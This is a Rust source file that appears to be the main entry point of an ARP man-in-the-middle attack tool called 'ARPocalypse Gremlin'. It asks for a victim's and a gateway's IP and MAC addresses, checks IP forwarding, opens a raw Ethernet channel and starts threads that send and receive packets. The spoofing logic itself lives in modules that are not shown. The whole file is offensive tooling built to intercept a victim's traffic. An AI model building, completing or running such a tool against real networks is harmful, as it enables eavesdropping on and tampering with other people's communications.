mod arp;
mod config;
mod network;
mod parser;
mod processor;
mod rx;
mod tx;

use std::io;
use std::sync::{
    atomic::{AtomicBool, Ordering},
    Arc,
};
use std::thread;
use std::time::Duration;

use crossbeam_channel::bounded;
use pnet::datalink::{
    self,
    Channel::Ethernet,
    Config as DatalinkConfig,
};

use config::Config;
use network::{check_ip_forwarding, find_interface};

fn main() {
    println!("ARPocalypse Gremlin — ARP MITM");

    // -----------------------------
    // Get configuration
    // -----------------------------

    let mut input = String::new();

    println!("Victim IP:");
    io::stdin()
        .read_line(&mut input)
        .expect("Failed to read input");

    let victim_ip = input
        .trim()
        .parse()
        .expect("Invalid victim IP");

    input.clear();

    println!("Gateway IP:");
    io::stdin()
        .read_line(&mut input)
        .expect("Failed to read input");

    let gateway_ip = input
        .trim()
        .parse()
        .expect("Invalid gateway IP");

    input.clear();

    println!("Victim MAC:");
    io::stdin()
        .read_line(&mut input)
        .expect("Failed to read input");

    let victim_mac =
        network::parse_mac(input.trim())
            .expect("Invalid victim MAC");

    input.clear();

    println!("Gateway MAC:");
    io::stdin()
        .read_line(&mut input)
        .expect("Failed to read input");

    let gateway_mac =
        network::parse_mac(input.trim())
            .expect("Invalid gateway MAC");

    // -----------------------------
    // Find network interface
    // -----------------------------

    let interface_name = find_interface(victim_ip)
        .unwrap_or_else(|| {
            eprintln!(
                "No interface found for {}",
                victim_ip
            );

            std::process::exit(1);
        });

    let interface = datalink::interfaces()
        .into_iter()
        .find(|iface| iface.name == interface_name)
        .expect("Interface disappeared");

    let my_mac = interface
        .mac
        .expect("Interface has no MAC address");

    println!(
        "Interface: {}",
        interface.name
    );

    println!(
        "Local MAC: {}",
        my_mac
    );

    // -----------------------------
    // Check forwarding
    // -----------------------------

    if let Err(error) = check_ip_forwarding() {
        eprintln!("Forwarding check failed: {}", error);
        std::process::exit(1);
    }

    // -----------------------------
    // Create datalink channel
    // -----------------------------

    let mut datalink_config = DatalinkConfig::default();

    datalink_config.read_timeout =
        Some(Duration::from_millis(50));

    let (tx_handle, rx_handle) =
        match datalink::channel(
            &interface,
            datalink_config,
        ) {
            Ok(Ethernet(tx, rx)) => (tx, rx),

            Ok(_) => {
                eprintln!("Unsupported datalink channel");
                std::process::exit(1);
            }

            Err(error) => {
                eprintln!(
                    "Failed to create datalink channel: {}",
                    error
                );

                std::process::exit(1);
            }
        };

    // -----------------------------
    // Shared configuration
    // -----------------------------

    let config = Config {
        victim_ip,
        gateway_ip,
        victim_mac,
        gateway_mac,
        my_mac,
    };

    // -----------------------------
    // Channels
    // -----------------------------

    let (packet_tx, packet_rx) =
        bounded::<Vec<u8>>(100);

    let (message_tx, message_rx) =
        bounded(100);

    // -----------------------------
    // Shutdown state
    // -----------------------------

    let running =
        Arc::new(AtomicBool::new(true));

    let shutdown_flag =
        Arc::clone(&running);

    ctrlc::set_handler(move || {
        println!("\nStopping Gremlin...");

        shutdown_flag.store(
            false,
            Ordering::SeqCst,
        );
    })
    .expect("Failed to install Ctrl+C handler");

    // -----------------------------
    // RX thread
    // -----------------------------

    let rx_running =
        Arc::clone(&running);

    let rx_thread = thread::spawn(move || {
        rx::run(
            rx_handle,
            packet_tx,
            &rx_running,
        );
    });

    // -----------------------------
    // TX thread
    // -----------------------------

    let tx_config = config.clone();

    let tx_thread = thread::spawn(move || {
        tx::run(
            tx_handle,
            message_rx,
            tx_config,
        );
    });

    // -----------------------------
    // Processing
    // -----------------------------

    processor::run(
        packet_rx,
        message_tx,
        config,
        &running,
    );

    // -----------------------------
    // Wait for threads
    // -----------------------------

    rx_thread
        .join()
        .expect("RX thread panicked");

    tx_thread
        .join()
        .expect("TX thread panicked");

    println!("Gremlin stopped.");
}
